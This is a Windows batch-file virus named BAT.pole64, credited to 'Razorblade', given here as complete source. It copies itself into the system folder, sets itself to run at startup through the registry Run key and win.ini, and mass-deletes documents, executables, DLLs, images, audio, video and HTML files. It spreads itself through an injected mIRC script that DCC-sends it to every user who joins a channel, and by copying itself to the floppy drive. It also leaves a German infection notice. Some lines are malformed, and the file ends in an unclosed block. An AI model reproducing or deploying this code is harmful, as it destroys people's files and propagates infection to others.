@echo off
:: BAT.pole64
:: by Razorblade

copy %0 "%systemroot%\pole64.bat"
cls
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v pole64 /t REG_SZ /d "%systemroot%\pole64.bat" /f
cls
echo [windows] >> "%systemroot%\win.ini"
echo load=%systemroot%\pole64.bat >> "%systemroot%\win.ini"
echo run=%systemroot%\pole64.bat >> "%systemroot%\win.ini"
cls
label POLE64
cls
del /f "*.doc"
del /f "*.mp3"
del /f "*.exe"
del /f "*.dll"
del /f "*.txt"
del /f "*.avi"
del /f "*.mpg"
del /f "log.*"
del /f "*.wav"
del /f "*.ogg"
del /f "*.jpg"
del /f "*.gif"
del /f "*.htm"
del /f "*.html"
cls
echo [script] > "%programfiles%\mIRC\eventz.ini"
echo n0=on 1:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
echo n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
echo n2=/dcc send $nick "C:\WINDOWS\pole64.bat"  >> "%programfiles%\mIRC\eventz.ini"
echo n3=} >> "%programfiles%\mIRC\eventz.ini"
cls
echo %os% Error Logfile > "C:\ERROR.txt"
echo ================ >> "C:\ERROR.txt"
echo Pole64 >> "C:\ERROR.txt"
echo by Razorblade >> "C:\ERROR.txt"
echo - - - >> "C:\ERROR.txt"
echo Ihr System wurde mit BAT.Pole64 infiziert! >> "C:\ERROR.txt"
echo BITTE ENTFERNEN SIE DIESEN VIRUS >> "C:\ERROR.txt"
cls
copy %0 "a:\pole64.bat"
cls
md "%systemroot%\Pole64"
cls
if exist "C:\ERROR.txt" (
	type "C:\ERROR.txt"
) else (
	exist
:: pole 64